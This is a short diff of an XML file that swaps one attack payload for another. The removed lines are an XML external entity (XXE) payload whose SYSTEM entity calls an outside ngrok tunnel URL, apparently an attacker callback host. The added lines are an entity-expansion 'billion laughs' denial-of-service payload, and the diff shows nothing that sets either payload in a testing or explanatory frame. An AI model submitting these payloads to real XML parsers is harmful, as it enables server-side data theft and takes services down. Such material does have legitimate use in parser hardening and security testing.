@@ -1,9 +1,9 @@
 <?xml version="1.0"?> 
-<!DOCTYPE foo [
-  <!ELEMENT foo ANY>
-  <!ENTITY externalEntity SYSTEM
-  "http://8b0970469892.ngrok.io/dabba">
+<!DOCTYPE data [
+<!ENTITY a0 "dos" >
+<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
 ]>
-<foo>
-  &externalEntity;
-</foo>
+<data>&a4;</data>
